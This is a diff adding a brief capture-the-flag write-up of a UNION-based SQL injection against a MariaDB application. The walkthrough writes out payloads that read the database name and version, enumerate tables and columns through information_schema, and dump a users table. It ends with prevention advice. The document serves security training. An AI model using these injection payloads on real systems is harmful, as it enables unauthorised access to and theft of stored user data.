@@ -1,0 +1,41 @@
+I started by testing a basic UNION injection to see if I could extract database information:
+1 UNION ALL SELECT 1,database(),1
+The response displayed the current database name The backend is using MySQL.
+This confirmed that the input was being executed inside a SQL query.
+Next, I retrieved the database version:
+1 UNION ALL SELECT 1,version() the response shows : 5.5.64-MariaDB-1ubuntu0.14.04.1
+The server returned the database version, confirming full SQL injection.
+After confirming the vulnerability, I enumerated the tables in the current database:
+-1 UNION SELECT group_concat(table_name),2 
+FROM information_schema.tables 
+WHERE table_schema = database()
+This returned users as name of table.
+Then I extracted the column names from the users table:
+-1 UNION SELECT group_concat(column_name),2 
+FROM information_schema.columns 
+WHERE table_name = 0x7573657273
+(0x7573657273 is the hexadecimal representation of "users")
+The response revealed the available columns.
+user_id,first_name,last_name,town,country,planet,Commentaire,countersign;
+Finally, I extracted the data from specific columns:
+1 UNION ALL SELECT 2,group_concat(Commentaire,0x0a) FROM users
+Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+and
+so i used the same thing on the countersign column 
+1 UNION ALL SELECT 2,group_concat(countersign,0x0a) FROM users
+it shows an encrypted value that means forty two
+using shasum i foound the flag 
+echo -n forty two | shasum -a 256
+
+If the database name can be extracted, then:
+Table names can be enumerated.
+Column names can be retrieved.
+Sensitive data can be dumped.
+Authentication mechanisms can be bypassed.
+
+HOW TO PREVENT THIS :
+Use prepared statements .
+Never concatenate user input into SQL.
+Validate and enforce correct input types.
+Apply least-privilege database permissions.
+Do not expose SQL error messages.
